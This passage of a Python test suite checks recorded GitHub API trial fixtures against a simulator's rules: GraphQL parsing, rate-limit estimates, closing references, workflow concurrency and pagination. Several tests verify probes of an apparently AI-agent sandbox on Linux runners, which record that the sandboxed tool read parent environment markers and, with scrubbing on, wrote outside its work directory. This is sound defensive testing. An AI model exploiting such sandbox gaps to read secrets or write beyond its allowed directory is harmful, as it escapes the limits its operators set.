        canary = "combsmith/" + check_trials.CANARY
        held = [p for p in (ROOT / "trials").glob("P-*.json") if json.loads(p.read_text())["repo"] == canary]
        self.assertGreaterEqual(len(held), 2)
        self.assertEqual(check_trials.run(), [])
        # What the reader reads: a fragment on another type is skipped, a string's escaped quote is read as part of it,
        # a command-line read of the canary is the org's, and an App the data does not know reaches the canary alone.
        roots, problem = check_trials._roots('query { repository(owner: "combsmith", name: "x") { ...F } } fragment F on Repository { id }')
        self.assertEqual((roots, problem), ([("repository", 'owner: "combsmith", name: "x"')], None))
        roots, problem = check_trials._roots('query { repository(owner: "combsmith", name: "a\\"b") { id } }')
        self.assertEqual(([f for f, _ in roots], problem), (["repository"], None))
        owners, repos, wrong = check_trials._asked({"via": "cli", "call": "gh pr list --repo combsmith/x -R combsmith/y"})
        self.assertEqual((owners, repos, wrong), ({"combsmith"}, {"combsmith/x", "combsmith/y"}, []))
        self.assertEqual(check_trials._installed(ROOT).get("nobody"), None)
        # The Apps' data that cannot be read is one problem, and every App is then held to the canary.
        data = json.loads((ROOT / "examples" / "invalid" / "trial.an-unknown-apps-read-beyond-the-canary.json").read_text())
        problems = check_trials._repos(data, None)
        self.assertEqual([where for where, _ in problems], ["config/apps.json", "exchanges[0].request.call"])
        self.assertIn("cannot be read", problems[0][1])
        # A comment holding a brace is a comment, and the query before it is read whole.
        roots, problem = check_trials._roots('query { repository(owner: "combsmith", name: "x") { id } } # }')
        self.assertEqual(([f for f, _ in roots], problem), (["repository"], None))

    def test_the_cost_trials_estimate_is_marked_so_and_held_to_its_reads(self):
        # P-8's last exchange is the estimate (FR-35): its cost model is held to every read of the fixture that reports
        # a rateLimit, recomputed here from each read's own variables, and its hourly figures to its figures a pass.
        p8 = json.loads((ROOT / "trials" / "P-8.json").read_text())
        estimate = p8["exchanges"][-1]["response"]["body"]
        self.assertIn("estimate", estimate["method"])
        self.assertEqual(p8["exchanges"][-1]["request"]["via"], "cli")
        reads = [e for e in p8["exchanges"][:-1] if (e["response"]["body"].get("data") or {}).get("rateLimit")]
        self.assertEqual(len(reads), len(estimate["model_checks"]))
        self.assertTrue(len(reads) >= 20)

        def model(calls):
            return max(1, int(calls / 100 + 0.5))

        for read, check in zip(reads, estimate["model_checks"]):
            reported = read["response"]["body"]["data"]["rateLimit"]["cost"]
            self.assertEqual(check["reported"], reported, read["request"]["call"])
            v = read["request"]["body"].get("variables", {})
            if {"prs", "issues", "threads"} <= set(v):
                # The pass's read: 2 + P x (8 + T) + 3 x I connections, a page of 0 counted as 1.
                self.assertEqual(reported, model(2 + max(v["prs"], 1) * (8 + v["threads"]) + 3 * v["issues"]), read["request"]["call"])
            self.assertEqual(check["model"], reported)
        self.assertEqual([c["reported"] for c in estimate["model_checks"]][-5:], estimate["reader_app_costs"])
        a_pass = estimate["points_a_pass"]
        self.assertEqual(a_pass["sized_to_counts_every_page"], a_pass["sized_to_counts"] + a_pass["further_pages"])
        for key, hourly in estimate["points_an_hour"].items():
            self.assertEqual(hourly["at_12_passes_an_hour_the_schedule"], 12 * a_pass[key], key)
            self.assertEqual(hourly["passes_an_hour_W4_allows"], estimate["W4"] // a_pass[key], key)
        self.assertEqual(p8["verdict"], "pass")
        self.assertLess(estimate["points_an_hour"]["sized_to_counts_every_page"]["at_12_passes_an_hour_the_schedule"], estimate["W4"])
        # P-32 fails on the association an App reads, and shows the label events it read: the rule it asks stays
        # unverified, since no unlabeled event and no event on a pull request was read.
        p32 = json.loads((ROOT / "trials" / "P-32.json").read_text())
        self.assertEqual(p32["verdict"], "fail")
        by_person, by_app = (e["response"]["body"]["data"]["repository"]["issues"]["nodes"] for e in p32["exchanges"])
        self.assertEqual({i["authorAssociation"] for i in by_person}, {"MEMBER"})
        self.assertEqual({i["authorAssociation"] for i in by_app}, {"CONTRIBUTOR"})
        events = [e for i in by_app for e in i["timelineItems"]["nodes"]]
        self.assertTrue(events)
        self.assertTrue(all(e["actor"]["login"] and e["actor"]["__typename"] and e["createdAt"] for e in events))
        by_code = {code: fixture for code, _, _, fixture, _ in check_trials.rules()}
        # The events ground the rule about them; the association, which an App reads wrong, is no rule of the fake: write
        # access is read from the collaborator permission, which P-47 asks (decision 0048).
        self.assertEqual(by_code["a_label_event_names_its_actor"], "trials/P-32.json")
        self.assertNotIn("an_issues_author_has_an_association", by_code)
        self.assertIn("a_logins_permission_is_read_from_the_collaborator_endpoint", by_code)

    def test_the_issue_fixtures_hold_what_grounds_the_four_rules(self):
        # trials/P-33.json and trials/P-34.json (issue 184) ground four rules of the issue world: each is held to the
        # content that grounds it, so a fixture emptied or inverted ungrounds its rule.
        by_code = {code: fixture for code, _, _, fixture, _ in check_trials.rules()}
        for code in ("a_closing_reference_is_read_from_any_pull_request", "who_changed_the_draft_flag_is_read"):
            self.assertEqual(by_code[code], "trials/P-33.json", code)
        for code in ("an_issues_content_time_is_read_apart", "a_reopening_names_its_actor"):
            self.assertEqual(by_code[code], "trials/P-34.json", code)
        p33 = json.loads((ROOT / "trials" / "P-33.json").read_text())
        self.assertEqual(p33["verdict"], "pass")
        prs = p33["exchanges"][0]["response"]["body"]["data"]["repository"]
        # To the default branch, a draft, an open and a closed-unmerged pull request each carry the issue, with the
        # author; to another base, a merged and an open one carry none.
        for case in ("draft", "open", "closed"):
            self.assertEqual([n["number"] for n in prs[case]["closingIssuesReferences"]["nodes"]], [36], case)
            self.assertEqual((prs[case]["baseRefName"], prs[case]["author"]["login"]), ("main", "don-petry"), case)
        for case in ("merged", "nondefault"):
            self.assertEqual((prs[case]["baseRefName"], prs[case]["closingIssuesReferences"]["totalCount"]),
                             ("trial/p-33-base", 0), case)
        self.assertEqual((prs["draft"]["isDraft"], prs["open"]["isDraft"], prs["merged"]["state"], prs["closed"]["state"]),
                         (True, False, "MERGED", "CLOSED"))
        # Who changed the draft flag, and when: ready, back to draft, ready again, each the Maintainer's.
        flags = [(n["__typename"], n["actor"]["login"]) for n in prs["open"]["timelineItems"]["nodes"]]
        self.assertEqual(flags, [("ReadyForReviewEvent", "don-petry"), ("ConvertToDraftEvent", "don-petry"),
                                 ("ReadyForReviewEvent", "don-petry")])
        times = [n["createdAt"] for n in prs["open"]["timelineItems"]["nodes"]]
        self.assertEqual(times, sorted(times))
        # Merged into the default branch, the reference stays and the issue closed, with the pull request as closer.
        after = p33["exchanges"][4]["response"]["body"]["data"]["repository"]
        self.assertEqual((after["merged"]["state"], after["merged"]["baseRefName"]), ("MERGED", "main"))
        self.assertEqual([(n["number"], n["state"]) for n in after["merged"]["closingIssuesReferences"]["nodes"]], [(36, "CLOSED")])
        closed = [n for n in after["issue"]["timelineItems"]["nodes"] if n["__typename"] == "ClosedEvent"]
        self.assertEqual([(n["closer"]["number"], n["actor"]["login"]) for n in closed], [(38, "don-petry")])
        # The ruleset was disabled for the merge and set back to active, and the exchanges are in the order they happened.
        states = [e["response"]["body"]["enforcement"] for e in p33["exchanges"] if e["request"]["via"] == "rest"]
        self.assertEqual(states, ["disabled", "active"])
        dates = [e["response"]["headers"]["date"] for e in p33["exchanges"]]
        self.assertEqual(dates, sorted(dates, key=lambda d: d[17:25]))
        p34 = json.loads((ROOT / "trials" / "P-34.json").read_text())
        self.assertEqual(p34["verdict"], "pass")
        issue = p34["exchanges"][0]["response"]["body"]["data"]["repository"]["issue"]
        events = {n["__typename"]: n for n in issue["timelineItems"]["nodes"]}
        # The body's time is lastEditedAt; the title's is the timeline's; the newer is the content's; updatedAt is the
        # reopening's, later than both; and the reopening names its actor.
        renamed, reopened = events["RenamedTitleEvent"], events["ReopenedEvent"]
        self.assertLess(issue["lastEditedAt"], renamed["createdAt"])
        self.assertLess(renamed["createdAt"], events["IssueComment"]["createdAt"])
        self.assertEqual(issue["updatedAt"], reopened["createdAt"])
        self.assertEqual((renamed["actor"]["login"], reopened["actor"]["login"], issue["stateReason"]),
                         ("don-petry", "don-petry", "REOPENED"))
        self.assertEqual([n["editor"]["login"] for n in issue["userContentEdits"]["nodes"]], ["don-petry", "don-petry"])

    def test_the_lane_keeps_one_running_and_one_waiting(self):
        # trials/P-44.json (issue 251) grounds a_run_waits_its_turn: the pass is computed here from the run lists and the
        # jobs as GitHub gave them, so a fixture edited to pass, or to say what it did not see, fails.
        by_code = {rule[0]: rule for rule in check_trials.rules()}
        self.assertEqual(by_code["a_run_waits_its_turn"][3], "trials/P-44.json")
        p44 = json.loads((ROOT / "trials" / "P-44.json").read_text())
        lists = [e["response"]["body"]["workflow_runs"] for e in p44["exchanges"]
                 if "/runs?branch=" in e["request"]["call"] and e["response"]["status"] == 200]
        self.assertGreaterEqual(len(lists), 10)
        for runs in lists:
            statuses = [r["status"] for r in runs]
            self.assertLessEqual(statuses.count("in_progress"), 1)
            self.assertLessEqual(sum(s in ("queued", "pending", "waiting") for s in statuses), 1)
        last = {r["run_number"]: r for r in lists[-1]}
        self.assertEqual({n: (r["event"], r["status"], r["conclusion"]) for n, r in last.items()},
                         {1: ("push", "completed", "success"), 2: ("push", "completed", "cancelled"),
                          3: ("push", "completed", "cancelled"), 4: ("push", "completed", "success")})
        jobs = {}
        for e in p44["exchanges"]:
            if e["request"]["call"].endswith("whether it ever had a runner and a step"):
                run = next(n for n, r in last.items() if "/runs/%d/jobs" % r["id"] in e["request"]["call"])
                (job,) = e["response"]["body"]["jobs"]
                jobs[run] = (job["conclusion"], bool(job["runner_name"]), len(job["steps"]))
        # Each cancelled run never started: no runner and no step. Each run that started finished.
        self.assertEqual(jobs, {1: ("success", True, 3), 2: ("cancelled", False, 0), 3: ("cancelled", False, 0),
                                4: ("success", True, 3)})
        # Run 1 was running when 2, 3 and 4 were queued, and finished; 4 started only once 1 had. Each cancelled run
        # ended as the next one was created.
        self.assertLess(last[4]["created_at"], last[1]["updated_at"])
        ended = {}
        for e in p44["exchanges"]:
            if e["request"]["call"].endswith("whether it ever had a runner and a step"):
                (job,) = e["response"]["body"]["jobs"]
                ended[job["run_id"]] = job["completed_at"]
        for n in (2, 3):
            self.assertGreaterEqual(ended[last[n]["id"]], last[n + 1]["created_at"], n)
        # The workflow ran as the analysis gives it, one job under one group that cancels nothing in progress: its blob
        # is the one the upload answered with.
        analysis = p44["exchanges"][-1]["response"]["body"]
        text = analysis["workflow"]
        self.assertIn("    concurrency:\n      group: lane-p44\n      cancel-in-progress: false\n", text)
        blob = hashlib.sha1(b"blob %d\0" % len(text.encode()) + text.encode()).hexdigest()
        upload = next(e for e in p44["exchanges"] if "contents/.github/workflows/trial-p44.yml" in e["request"]["call"])
        self.assertEqual(upload["response"]["body"]["content"]["sha"], blob)
        self.assertEqual(p44["verdict"], "pass")
    def test_an_edit_after_the_merge_changes_the_closing_references(self):
        # trials/P-46.json (issue 256): its verdict is computed here from the reads by the pass condition, so a fixture
        # edited to pass, or to say what it did not see, fails. It grounds the rule the fake now applies (issue 267):
        # the edit closed nothing, and the merge's own close, in trials/P-33.json, names the pull request the closer.
        by_code = {rule[0]: rule for rule in check_trials.rules()}
        self.assertNotIn("a_merged_pull_requests_closing_references_are_fixed", by_code)
        rule = by_code["a_merge_closes_the_issue_it_names_and_an_edit_after_it_closes_nothing"]
        self.assertEqual((rule[2], rule[3]), (("P-33", "P-46"), "trials/P-46.json"))
        p33 = json.loads((ROOT / "trials" / "P-33.json").read_text())
        closes = [node for e in p33["exchanges"] if isinstance(e["response"].get("body"), dict)
                  for node in (((e["response"]["body"].get("data") or {}).get("repository") or {}).get("issue") or {})
                  .get("timelineItems", {}).get("nodes", []) if node.get("__typename") == "ClosedEvent"]
        self.assertEqual([c["closer"] for c in closes], [{"__typename": "PullRequest", "number": 38}])
        p46 = json.loads((ROOT / "trials" / "P-46.json").read_text())
        n = p46["exchanges"][0]["response"]["body"]["number"]           # the issue the trial opened
        reads = [e["response"]["body"]["data"]["repository"] for e in p46["exchanges"] if e["request"]["via"] == "graphql"]
        self.assertEqual({r["pullRequest"]["number"] for r in reads}, {38})
        self.assertEqual({r["issue"]["number"] for r in reads}, {n})
        self.assertEqual({r["pullRequest"]["state"] for r in reads}, {"MERGED"})
        refs = [sorted(x["number"] for x in r["pullRequest"]["closingIssuesReferences"]["nodes"]) for r in reads]
        # The pass condition: fail if an edit after the merge put N among the merged pull request's references.
        self.assertEqual(p46["verdict"], "fail" if any(n in r for r in refs[1:]) else "pass")
        self.assertEqual(refs, [[36], [36, n], [36, n], [36], [36]],
                         "before, after the edit twice, after it was undone, and after the exact restore")
        merged_at = reads[0]["pullRequest"]["mergedAt"]
        # The edit came after the merge, and the issue it named stayed open until the trial closed it; its timeline
        # holds a cross-reference timed after the merge that says it will not close the issue, and the trial's close.
        self.assertGreater(reads[1]["pullRequest"]["lastEditedAt"], merged_at)
        self.assertEqual([r["issue"]["state"] for r in reads], ["OPEN"] * 4 + ["CLOSED"])
        events = reads[-1]["issue"]["timelineItems"]["nodes"]
        self.assertEqual([(e["__typename"], e.get("willCloseTarget")) for e in events],
                         [("CrossReferencedEvent", False), ("ClosedEvent", None)])
        self.assertEqual((events[0]["source"]["number"], events[1]["closer"]), (38, None))
        self.assertGreater(events[0]["createdAt"], merged_at)
        # The edit added one line, the undo took it out, and the canary was left with the description it had.
        bodies = [e["request"]["body"]["body"] for e in p46["exchanges"]
                  if e["request"]["call"].startswith("PATCH /repos/") and "/pulls/" in e["request"]["call"]]
        self.assertEqual(bodies[0].replace("Closes #%d\n" % n, "", 1), bodies[1])
        self.assertEqual((bodies[2], reads[-1]["pullRequest"]["body"]), (reads[0]["pullRequest"]["body"],) * 2)
        analysis = p46["exchanges"][-1]["response"]["body"]
        self.assertEqual(list(analysis["closing_references"].values()), refs)
        self.assertTrue(analysis["n_added_by_the_edit"] and analysis["n_removed_when_undone"] and analysis["restored_exactly"])

    def test_each_list_read_short_says_so(self):
        # trials/P-43.json (issue 250) grounds three rules: its answer is computed here from the reads themselves, so a
        # fixture edited to pass, or to say what it did not see, fails.
        by_code = {rule[0]: rule[3] for rule in check_trials.rules()}
        for code in ("a_short_list_says_so", "a_pull_request_lists_the_paths_it_changes", "a_short_path_list_says_so"):
            self.assertEqual(by_code[code], "trials/P-43.json", code)
        self.assertEqual(by_code["a_run_list_stops_short"], "trials/P-43.json")
        p43 = json.loads((ROOT / "trials" / "P-43.json").read_text())
        self.assertEqual(p43["verdict"], "pass")
        call = lambda fragment: next(e for e in p43["exchanges"] if fragment in e["request"]["call"])
        pr = call("each read one to a page")["response"]["body"]["data"]["repository"]["pullRequest"]
        rollup = pr["commits"]["nodes"][0]["commit"]["statusCheckRollup"]["contexts"]
        for name, read in [(k, pr[k]) for k in ("reviews", "reviewThreads", "labels", "timelineItems", "files")] + [("checks", rollup)]:
            self.assertEqual(len(read["nodes"]), 1, name)
            self.assertGreater(read["totalCount"], 1, name)
            self.assertTrue(read["pageInfo"]["hasNextPage"] and read["pageInfo"]["endCursor"], name)
        for fragment in ("files?per_page=1 ", "reviews?per_page=1 ", "comments?per_page=1 ", "timeline?per_page=1 ",
                         "labels?per_page=1 ", "check-runs?per_page=1 "):
            e = call(fragment)
            body = e["response"]["body"]
            self.assertEqual(len(body["check_runs"] if isinstance(body, dict) else body), 1, fragment)
            self.assertIn('rel="next"', e["response"]["headers"]["link"], fragment)
        # The files whole: once each, by path, the rename with its old path in REST alone, the copy as an added file.
        files = {f["filename"]: (f["status"], f.get("previous_filename")) for f in call("files whole, by REST")["response"]["body"]}
        self.assertEqual(files, {"p3/README.md": ("modified", None), "p43/README-copied.md": ("added", None),
                                 "trial-notes/p-43-renamed.md": ("renamed", "trial-notes/p-1.md")})
        self.assertEqual(call("for changed_files")["response"]["body"]["changed_files"], len(files))
        nodes = call("files whole, by GraphQL")["response"]["body"]["data"]["repository"]["pullRequest"]["files"]["nodes"]
        self.assertEqual({n["path"]: n["changeType"] for n in nodes},
                         {"p3/README.md": "MODIFIED", "p43/README-copied.md": "ADDED", "trial-notes/p-43-renamed.md": "RENAMED"})
        # The run list reads whole: the last run is the count's, and a page past it is empty.
        last, past = call("page=1873 ")["response"]["body"], call("page=1874 ")["response"]["body"]
        self.assertEqual((last["total_count"], len(last["workflow_runs"]), len(past["workflow_runs"])), (1873, 1, 0))
        first, at, after = (call("runs?per_page=1&page=%d " % n)["response"]["body"] for n in (1, 1000, 1001))
        self.assertEqual([b["total_count"] for b in (first, at, after)], [1873] * 3)
        self.assertNotEqual(at["workflow_runs"][0]["id"], after["workflow_runs"][0]["id"], "past the thousandth")
        self.assertGreater(call("check-runs?per_page=1 ")["response"]["body"]["total_count"], 1)
        # With a filter, as the records port reads one, the list stops at 1,000: the first page counts more, the
        # thousandth names a next page, and the one after is empty and counts nothing.
        one, thousand, past = (call("status=completed&per_page=1&page=%d " % n)["response"] for n in (1, 1000, 1001))
        self.assertGreater(one["body"]["total_count"], 1000)
        self.assertEqual(len(thousand["body"]["workflow_runs"]), 1)
        self.assertIn('rel="next"', thousand["headers"]["link"])
        self.assertEqual((past["body"]["total_count"], past["body"]["workflow_runs"], past["headers"].get("link")), (0, [], None))
        self.assertEqual(p43["ran_at"], call("for when the trial began")["response"]["body"]["commit"]["author"]["date"])

    def test_a_sandboxed_tool_on_a_linux_runner_writes_outside_its_work_directory_when_scrubbed(self):
        # trials/P-51.json (issue 312): the analysis is read again from the job's log, each configuration's holds are
        # computed from what it recorded, and the fail follows: with the scrub at 1 every write outside the work
        # directory landed, in both orders; unset or 0, none did.
        p51 = json.loads((ROOT / "trials" / "P-51.json").read_text())
        log, analysis = p51["exchanges"][8]["response"]["body"], p51["exchanges"][-1]["response"]["body"]
        printed, lines, inside = {}, [], False
        for line in log.splitlines():
            said = re.match(r"^[^\t]*\t[^\t]*\t\S+Z (.*)$", line)
            said = said.group(1) if said else ""
            inside, lines = (True, []) if said == "{" else (inside, lines)
            lines += [said] if inside else []
            if inside and said == "}":
                document, inside = json.loads("\n".join(lines)), False
                printed[document["order"]] = document
        self.assertEqual(printed, analysis["orders"], "the analysis is what the log printed")
        for i, name in ((6, "p51/run.sh"), (7, "p51/stub.py")):
            self.assertEqual(p51["exchanges"][i]["response"]["body"]["sha"], analysis["copied_whole"][name]["canary"])
            self.assertEqual(len(set(analysis["copied_whole"][name].values())), 1, name + " ran as it was in tools/")
        for order, checked in printed.items():
            self.assertEqual(checked["version"], {"pinned": "2.1.306", "before": "2.1.306", "after": "2.1.306"})
            names = [part["configuration"] for part in checked["configurations"]]
            self.assertEqual(names, ["unset", "plain", "scrubbed"] if order == "forward" else ["scrubbed", "plain", "unset"])
            for part in checked["configurations"]:
                where = (order, part["configuration"])
                landed = [target for target, write in part["writes"].items() if write["landed"]]
                self.assertEqual((part["exit"], part["probe_ran"], part["holds"]["tool_ran"], part["pid_namespace"]["own"],
                                  part["inside"]["landed"]), (0, True, True, True, True), where)
                self.assertEqual(part["holds"]["every_write_held"], not landed, where)
                self.assertEqual(sorted(landed), sorted(part["writes"]) if part["configuration"] == "scrubbed" else [], where)
            self.assertEqual(checked["every_configuration_passes"], False, order)
        self.assertEqual(p51["verdict"], "fail")

    def test_a_sandboxed_tool_on_a_linux_runner_reads_the_parents_environment(self):
        # trials/P-50.json (issue 287): the analysis is read again here from the job's log, each part of the pass is
        # computed from what the probe left, as the script computes it, and must equal the job's record; the fail follows.
        p50 = json.loads((ROOT / "trials" / "P-50.json").read_text())
        log, analysis = p50["exchanges"][18]["response"]["body"], p50["exchanges"][-1]["response"]["body"]
        printed, lines, inside = {}, [], False
        for line in log.splitlines():
            said = re.match(r"^[^\t]*\t[^\t]*\t\S+Z (.*)$", line)
            said = said.group(1) if said else ""
            inside, lines = (True, []) if said == "{" else (inside, lines)
            lines += [said] if inside else []
            if inside and said == "}":
                document, inside = json.loads("\n".join(lines)), False
                printed[document["phase"]] = document
        self.assertEqual(printed, analysis["phases"], "the analysis is what the log printed")
        for i, name in ((16, "p50/run.sh"), (17, "p50/stub.py")):
            self.assertEqual(p50["exchanges"][i]["response"]["body"]["sha"], analysis["copied_whole"][name]["canary"])
            self.assertEqual(len(set(analysis["copied_whole"][name].values())), 1, name + " ran as it was in tools/")
        self.assertEqual(sorted(printed), ["as-is", "userns", "userns-reversed"])
        for phase, checked in printed.items():
            self.assertEqual(checked["version"], {"pinned": "2.1.306", "before": "2.1.306", "after": "2.1.306"})
            order = [part["configuration"] for part in checked["configurations"]]
            self.assertEqual(order, ["scrubbed", "plain"] if phase == "userns-reversed" else ["plain", "scrubbed"])
            for part in checked["configurations"]:
                where = (phase, part["configuration"])
                ran = part["probe_ran"] and (part["env"]["lines"] or 0) > 0
                hidden = ran and part["ancestors"]["stopped"] in ("above", "zero", "no-status") \
                    and not any(part["env"]["seen"].values()) and not any(part["ancestors"]["seen"].values())
                held = ran and part["write_outside_the_work_directory"]["landed"] is False
                self.assertEqual((part["holds"]["environment_hidden"], part["holds"]["sandbox_held_the_write"]), (hidden, held), where)
                # tool_ran says the tool's result went back to the stub, an error or not; probe_ran says it ran.
                self.assertEqual((part["exit"], part["answer"]["is_error"], part["holds"]["tool_ran"]), (0, False, True), where)
                if phase == "as-is":
                    # As the runner stands the tool's result came back an error and the probe never ran, though the
                    # CLI exited 0 with failIfUnavailable set.
                    self.assertEqual((part["probe_ran"], part["stub"]["result_is_error"]), (False, [True]), where)
                    continue
                # With user namespaces the tool is in a PID namespace of its own, the CLI out of its sight; it holds the
                # parent marker, as does the one process above it that it could read, and the next refuses.
                self.assertEqual((part["pid_namespace"]["own"], part["env"]["seen"]["parent"], part["ancestors"]["seen"]["parent"]),
                                 (True, True, True), where)
                self.assertEqual((part["ancestors"]["read_exits"], part["ancestors"]["stopped"]), ([0, 2], "zero"), where)
                self.assertEqual(part["env"]["seen"]["listed"], part["configuration"] == "plain", where)
                # The write outside the work directory lands when the scrub is on, whichever Task runs first.
                self.assertEqual(part["write_outside_the_work_directory"]["landed"], part["configuration"] == "scrubbed", where)
            self.assertEqual(checked["some_configuration_passes"], False, phase)
        self.assertEqual(p50["verdict"], "fail")

    def test_the_sandbox_limits_connections_and_passes_the_environment(self):
        # trials/P-26.json (issue 188): each part of the pass is computed here from what the probe left, as the script
        # computes it, and must equal the script's record; the fail follows. The Tasks' answers hold none of the model's text.
        p26 = json.loads((ROOT / "trials" / "P-26.json").read_text())
        checked = p26["exchanges"][-1]["response"]["body"]
        parts = {p["configuration"]: p for p in checked["configurations"]}
        self.assertEqual(sorted(parts), ["plain", "scrubbed"])
        answered = lambda f: f.get("exit") == 0 and 200 <= f.get("http", 0) < 600
        for name, part in parts.items():
            fetches = part["fetches"]
            ran = part["probe_ran"] and (part["env"]["lines"] or 0) > 0
            hidden = ran and not any(part["env"]["seen"].values()) and not any(part["ancestors"]["seen"].values())
            limited = ran and answered(fetches["allowed_through_proxy"]) and not answered(fetches["denied_through_proxy"]) \
                and not answered(fetches["denied_around_proxy"])
            self.assertEqual((part["holds"]["environment_hidden"], part["holds"]["connections_limited"]), (hidden, limited), name)
            self.assertEqual((hidden, limited), (False, True), name)
            self.assertEqual(fetches["denied_through_proxy"]["connect"], 403, name)
            self.assertEqual(part["write_outside_the_work_directory"]["landed"], False, name)
            # No process was read: the one read tried failed and left nothing.
            self.assertTrue(part["ancestors"]["read_exits"] and 0 not in part["ancestors"]["read_exits"], name)
            self.assertEqual(part["ancestors"]["lines"], 0, name)
        # With the scrub, the marker under a listed name was gone and the other stayed.
        self.assertEqual([(parts[c]["env"]["seen"]["parent"], parts[c]["env"]["seen"]["listed"]) for c in ("plain", "scrubbed")],
                         [(True, True), (True, False)])
        self.assertEqual((checked["some_configuration_hides_and_limits"], p26["verdict"]), (False, "fail"))
        for exchange in p26["exchanges"][2:4]:
            self.assertNotIn("result", exchange["response"]["body"])

    def test_a_dependency_bot_opens_and_pushes_its_update(self):
        # trials/P-45.json (issue 251) grounds a_dependency_bot_updates_a_workflow_pin: the pass is computed here from the
        # reads, so a fixture edited to pass, or to say what it did not see, fails.
        by_code = {rule[0]: rule[3] for rule in check_trials.rules()}
        self.assertEqual(by_code["a_dependency_bot_updates_a_workflow_pin"], "trials/P-45.json")
        p45 = json.loads((ROOT / "trials" / "P-45.json").read_text())
        call = lambda fragment: next(e for e in p45["exchanges"] if fragment in e["request"]["call"])
        pr = call("Dependabot's pull request")["response"]["body"]
        author = call("author with its type")["response"]["body"]["data"]["repository"]["pullRequest"]["author"]
        pushes = call("as P-28 reads")["response"]["body"]
        bot = (pr["user"]["id"], pr["user"]["type"])
        self.assertEqual((pr["user"]["login"], bot), ("dependabot[bot]", (49699333, "Bot")))
        self.assertEqual((author["databaseId"], author["__typename"]), bot, "GraphQL names it otherwise, with the same id")
        self.assertTrue(pushes)
        self.assertEqual({(a["actor"]["id"], a["actor"]["type"]) for a in pushes}, {bot}, "every push is the bot's")
        files = call("what the update changes")["response"]["body"]
        self.assertEqual([(f["filename"], f["status"]) for f in files], [(".github/workflows/p45-pinned.yml", "modified")])
        self.assertIn("+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1", files[0]["patch"])
        self.assertEqual(p45["verdict"], "pass")

    def test_a_rule_of_the_fake_that_is_not_listed_is_caught(self):
        world = (ROOT / "sim" / "world.py").read_text()
        problems = check_trials.run(clone({"sim/world.py": world + "\n# GitHub: a_rule_nobody_listed\n"}))
        self.assertTrue(caught(problems, "sim/world.py applies a_rule_nobody_listed, which sim/grounding.py does not list"))
        listed = GROUNDING.replace("RULES = (", 'RULES = (\n    ("a_rule_never_applied", "It is so", ("P-1",), None, None),', 1)
        problems = check_trials.run(clone({"sim/grounding.py": listed}))
        self.assertTrue(caught(problems, "a_rule_never_applied is listed in sim/grounding.py and applied nowhere under sim/"))
        issues = (ROOT / "sim" / "issues.py").read_text()
        problems = check_trials.run(clone({"sim/issues.py": issues + "\n# GitHub: a_rule_nobody_listed\n"}))
        self.assertTrue(caught(problems, "sim/issues.py applies a_rule_nobody_listed, which sim/grounding.py does not list"))
        twice = GROUNDING.replace("RULES = (", 'RULES = (\n    ("a_tick_can_be_lost", "It is so", ("P-8",), None, None),', 1)
        self.assertTrue(caught(check_trials.run(clone({"sim/grounding.py": twice})), "a_tick_can_be_lost is listed twice"))
        for broken in ("RULES = rules()\n", "RULES = (('Not a code', 'x', ('P-1',), None, None),)\n", "RULES = (('x', 'x'),)\n",
                       "x = 1\n", "RULES = (('a_tick_can_be_lost', 'x', 'P-8', None, None),)\n",
                       "RULES = (('a_tick_can_be_lost', 'x', ('P-8',), None),)\n"):
            self.assertTrue(check_trials.run(clone({"sim/grounding.py": broken})), broken)

    def test_a_rule_no_trial_asks_names_one_or_says_why_none_can(self):  # issue 190
        # A rule with no trial and no fixture says, in one sentence, why no trial can ask it; one a trial asks says
        # nothing of the kind; and the printed list says which it is.
        head = 'RULES = (\n    ("a_rule_nobody_asks", "It is so", (), None, %s),'
        for note in ("None", '""', '"no trial asks it"', '"%s"' % check_trials.ASSUMED, '"%s  "' % check_trials.ASSUMED, "5"):
            problems = check_trials.run(clone({"sim/grounding.py": GROUNDING.replace("RULES = (", head % note, 1),
                                               "sim/world.py": (ROOT / "sim" / "world.py").read_text() + "\n# GitHub: a_rule_nobody_asks\n"}))
            self.assertTrue(caught(problems, "a_rule_nobody_asks: no trial asks this; name the trial of section 6 that will, or "
                                             "say in one sentence why none can"), note)
        said = GROUNDING.replace("RULES = (", head % '"%sa race no trial can force"' % check_trials.ASSUMED, 1)
        world = (ROOT / "sim" / "world.py").read_text() + "\n# GitHub: a_rule_nobody_asks\n"
        self.assertEqual(check_trials.run(clone({"sim/grounding.py": said, "sim/world.py": world})), [])
        # The reason says something, in one sentence, after the whole of its opening: a full stop or a character that
        # does not print is no sentence, nor are two, nor a reason with another opening.
        for empty in (".", "\u200b", " - ", "a race. And a second one", "a race! Then more"):
            problems = check_trials.run(clone({"sim/grounding.py": GROUNDING.replace("RULES = (", head % ('"%s%s"' % (check_trials.ASSUMED, empty)), 1),
                                               "sim/world.py": world}))
            self.assertTrue(caught(problems, "a_rule_nobody_asks: no trial asks this"), repr(empty))
        for other in ('"assumed: a race no trial can force"', '"Assumed, no trial can ask it: a race no trial can force"',
                      '"assumed, no trial can ask it a race no trial can force"'):
            problems = check_trials.run(clone({"sim/grounding.py": GROUNDING.replace("RULES = (", head % other, 1),
                                               "sim/world.py": world}))
            self.assertTrue(caught(problems, "a_rule_nobody_asks: no trial asks this"), other)
        grounded_too = GROUNDING.replace('"trials/P-29.base.json", None)', '"trials/P-29.base.json", "%sa race")' % check_trials.ASSUMED, 1)
        self.assertNotEqual(grounded_too, GROUNDING)
        self.assertTrue(caught(check_trials.run(clone({"sim/grounding.py": grounded_too})),
                               "a_push_is_new_content: a trial asks this, or a fixture grounds it, so it says nothing"))
        # A trial a rule names has a row in section 6: a P-number of the right shape is not enough.
        nowhere = GROUNDING.replace("RULES = (", 'RULES = (\n    ("a_rule_nobody_asks", "It is so", ("P-99",), None, None),', 1)
        self.assertTrue(caught(check_trials.run(clone({"sim/grounding.py": nowhere, "sim/world.py": world})),
                               "a_rule_nobody_asks: P-99 has no row in section 6; add the trial there first"))
        design = (ROOT / check_trials.DESIGN).read_text()
        rowless = design.replace("| P-41 |", "| P-41a |", 1)
        self.assertTrue(caught(check_trials.run(clone({check_trials.DESIGN: rowless})),
                               "a_request_for_changes_survives_a_push: P-41 has no row in section 6"))
        # Only section 6's own table counts: a row before it, or in a fenced block within it, is no trial.
        p99 = GROUNDING.replace('("P-41",), None, None)', '("P-99",), None, None)', 1)
        for elsewhere in ("| P-99 | x | y |\n" + design, design.replace("\n## 6. ", "\n```\n| P-99 | x | y |\n```\n## 6. ", 1),
                          design.replace("| P-41 |", "```\n| P-99 | x | y |\n```\n| P-41 |", 1)):
